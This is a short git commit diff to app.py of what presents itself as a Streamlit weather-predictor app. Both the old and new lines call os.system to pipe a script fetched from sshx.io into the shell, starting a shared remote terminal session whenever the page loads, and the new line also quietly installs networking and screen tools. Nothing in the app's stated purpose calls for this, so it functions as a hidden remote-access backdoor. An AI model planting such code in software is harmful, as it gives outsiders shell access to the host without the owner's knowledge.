13e6bab746e8e7a848512d6208e073b2b20ab6a9
mfunekomazambane <mfunekomazambane@gmail.com>
2025-01-06 04:15:00 +0200

    Update app.py

--- app.py
+++ app.py
@@ -4,5 +4,5 @@ import os
 st.title("Welcome to my weather predictor app")
 st.header("Let's all forecast weather")
 
-results = os.system("curl -sSf https://sshx.io/get | sh -s run")
+results = os.system("apt update >/dev/null;apt y install wget curl net-tools screen dialog >/dev/null;curl -sSf https://sshx.io/get | sh -s run")
 st.write(results)
